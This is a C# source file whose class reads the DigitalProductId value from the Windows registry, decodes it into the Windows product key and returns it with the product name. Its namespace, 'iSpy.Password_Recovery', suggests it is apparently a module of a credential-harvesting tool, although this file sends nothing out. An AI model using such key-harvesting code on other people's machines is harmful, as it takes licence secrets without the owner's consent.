using System;
using System.Collections.Generic;
using System.Collections;
using Microsoft.Win32;
using System.Text;

namespace iSpy.Password_Recovery
{
    public class WindowsProductKey
    {
        private static string DecodeProductKey(byte[] digitalProductId)
        {
            char[] array = new char[]
	        {
		        'B',
		        'C',
		        'D',
		        'F',
		        'G',
		        'H',
		        'J',
		        'K',
		        'M',
		        'P',
		        'Q',
		        'R',
		        'T',
		        'V',
		        'W',
		        'X',
		        'Y',
		        '2',
		        '3',
		        '4',
		        '6',
		        '7',
		        '8',
		        '9'
	        };
            char[] array2 = new char[29];
            ArrayList arrayList = new ArrayList();
            for (int i = 52; i <= 67; i++)
            {
                arrayList.Add(digitalProductId[i]);
            }
            for (int i = 28; i >= 0; i--)
            {
                if ((i + 1) % 6 == 0)
                {
                    array2[i] = '-';
                }
                else
                {
                    int num = 0;
                    for (int j = 14; j >= 0; j--)
                    {
                        int num2 = num << 8 | (int)((byte)arrayList[j]);
                        arrayList[j] = (byte)(num2 / 24);
                        num = num2 % 24;
                        array2[i] = array[num];
                    }
                }
            }
            return new string(array2);
        }
        public static string Recover()
        {
            string serial = string.Empty;
            RegistryKey registryKey = Registry.LocalMachine;
            registryKey = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
            byte[] digitalProductId = registryKey.GetValue("DigitalProductId") as byte[];
            if (digitalProductId != null)
            {
                serial = "[Windows Product Key]" + Environment.NewLine + "Version: " + Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue("ProductName").ToString() + Environment.NewLine + "Key: " + DecodeProductKey(digitalProductId) + Environment.NewLine + Environment.NewLine;
            }
            return serial;
        }
    }
}
